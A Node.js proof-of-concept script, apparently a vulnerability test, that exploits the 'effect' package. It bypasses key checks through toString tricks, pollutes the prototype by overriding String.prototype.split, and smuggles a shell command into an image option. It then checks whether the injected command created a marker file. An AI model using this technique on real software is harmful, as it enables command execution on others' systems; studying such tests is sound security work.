var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
const Root = require('effect');
const fs = require('fs');
const path = './effect';
var options = { image: '& fsutil file createnew effect 0' };
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
Root.edge(options, () => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    try {
        fs.unlinkSync('-colorspace');
        fs.unlinkSync('-edge');
        fs.unlinkSync('-negate');
        fs.unlinkSync('-resize');
        fs.unlinkSync('5');
        fs.unlinkSync('100%');
        fs.unlinkSync('Gray');
        fs.unlinkSync(path);
    } catch (err) {
    }
});